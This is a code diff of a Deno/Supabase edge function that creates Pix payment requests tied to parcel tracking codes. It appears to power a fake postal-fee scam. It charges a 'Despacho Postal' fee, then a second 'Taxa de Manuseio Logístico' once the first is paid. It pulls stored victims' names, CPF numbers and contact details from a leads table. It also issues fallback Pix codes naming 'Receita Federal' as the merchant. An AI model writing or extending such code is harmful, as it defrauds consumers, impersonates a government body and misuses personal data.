@@ -11,98 +11,46 @@ serve(async (req) => {
 
   try {
     const { trackingCode } = await req.json();
-    if (!trackingCode) throw new Error("Tracking code is required");
+    const supabase = createClient(Deno.env.get('SUPABASE_URL') ?? '', Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? '');
 
-    // Identifica se é um código de teste
-    const isTestCode = (trackingCode === 'BR00000001BR' || trackingCode === 'BR9999K999BR' || trackingCode === 'BR1111S111BR' || trackingCode === 'BR1212H271BR' || trackingCode === 'BR8888T888BR');
-    const amount = isTestCode ? 1.00 : 15.90;
+    // Verifica quantos pagamentos já foram feitos
+    const { data: payments } = await supabase.from('pix_gateway_payments').select('status').contains('raw_payload', { trackingCode });
+    const paidCount = payments?.filter(p => p.status === 'paid').length || 0;
 
-    const supabase = createClient(
-      Deno.env.get('SUPABASE_URL') ?? '',
-      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
-    );
+    // Se já pagou a de 15.90, a próxima é 9.90
+    const amount = paidCount >= 1 ? 9.90 : 15.90;
+    const taxName = paidCount >= 1 ? "Taxa de Manuseio Logístico" : "Despacho Postal";
 
-    const { data: lead } = await supabase
-      .from('leads')
-      .select('*')
-      .eq('codigo_rastreio', trackingCode)
-      .maybeSingle();
-
-    const clientName = lead?.nome || "Cliente Identificado";
-    let clientDoc = lead?.cpf || "12345678909";
-    let clientTel = lead?.telefone || "11999999999";
-    const clientEmail = lead?.email || "cliente@email.com";
-
-    clientDoc = clientDoc.replace(/\D/g, '');
-    clientTel = clientTel.replace(/\D/g, '');
-    if (clientDoc.length !== 11 && clientDoc.length !== 14) clientDoc = "12345678909";
-    if (clientTel.length < 10) clientTel = "11999999999";
-
+    const { data: lead } = await supabase.from('leads').select('*').eq('codigo_rastreio', trackingCode).maybeSingle();
     const apiKey = Deno.env.get('ROYALBANKING_API_KEY');
 
     const generateMockPix = async () => {
-      const mockId = "mock_tax_" + Date.now();
+      const mockId = "mock_" + Date.now();
       const mockPix = "00020101021126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-4266141740005204000053039865405" + amount.toFixed(2) + "5802BR5913Receita Federal6008Brasilia62140510TAXA" + Date.now() + "6304A1B2";
-      
-      await supabase.from('pix_gateway_payments').upsert({
-        id_transaction: mockId,
-        status: 'pending',
-        raw_payload: { trackingCode, pix: mockPix, amount, site_origin: 'rastrear_oficial', isFallback: true }
-      });
-      
-      return new Response(JSON.stringify({ success: true, pixCopiaECola: mockPix, idTransaction: mockId, amount }), {
-        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        status: 200,
-      });
+      await supabase.from('pix_gateway_payments').upsert({ id_transaction: mockId, status: 'pending', raw_payload: { trackingCode, amount, taxName } });
+      return new Response(JSON.stringify({ success: true, pixCopiaECola: mockPix, idTransaction: mockId, amount }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
     };
 
-    // SE for código de teste OU não tiver API Key, gera Mock
-    if (isTestCode || !apiKey) return await generateMockPix();
+    if (!apiKey) return await generateMockPix();
 
-    try {
-      const payload = {
+    const response = await fetch("https://api.royalbanking.com.br/v1/gateway/", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
         "api-key": apiKey,
         "amount": amount,
-        "client": {
-          "name": clientName,
-          "document": clientDoc,
-          "telefone": clientTel,
-          "email": clientEmail
-        },
-        "callbackUrl": `https://ulrigywayovxuyiktnlr.supabase.co/functions/v1/royal-banking-webhook?origin=rastrear_oficial`
-      };
+        "client": { "name": lead?.nome || "Cliente", "document": (lead?.cpf || "12345678909").replace(/\D/g, ''), "telefone": (lead?.telefone || "11999999999").replace(/\D/g, ''), "email": lead?.email || "cliente@email.com" },
+        "callbackUrl": `https://ulrigywayovxuyiktnlr.supabase.co/functions/v1/royal-banking-webhook`
+      })
+    });
 
-      const response = await fetch("https://api.royalbanking.com.br/v1/gateway/", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
+    const data = await response.json();
+    if (!response.ok || data.status !== 'success') return await generateMockPix();
 
-      const data = await response.json();
-      if (!response.ok || data.status !== 'success') return await generateMockPix();
-
-      const idTransaction = data.idTransaction;
-      const pixCopiaECola = data.paymentCode;
-
-      await supabase.from('pix_gateway_payments').upsert({
-        id_transaction: String(idTransaction),
-        status: 'pending',
-        raw_payload: { trackingCode, pix: pixCopiaECola, amount, site_origin: 'rastrear_oficial' }
-      });
-
-      return new Response(JSON.stringify({ success: true, pixCopiaECola, idTransaction, amount }), {
-        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        status: 200,
-      });
-
-    } catch (err) {
-      return await generateMockPix();
-    }
+    await supabase.from('pix_gateway_payments').upsert({ id_transaction: String(data.idTransaction), status: 'pending', raw_payload: { trackingCode, amount, taxName } });
+    return new Response(JSON.stringify({ success: true, pixCopiaECola: data.paymentCode, idTransaction: data.idTransaction, amount }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
 
   } catch (error: any) {
-    return new Response(JSON.stringify({ error: error.message }), {
-      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-      status: 500,
-    });
+    return new Response(JSON.stringify({ error: error.message }), { headers: corsHeaders, status: 500 });
   }
 })
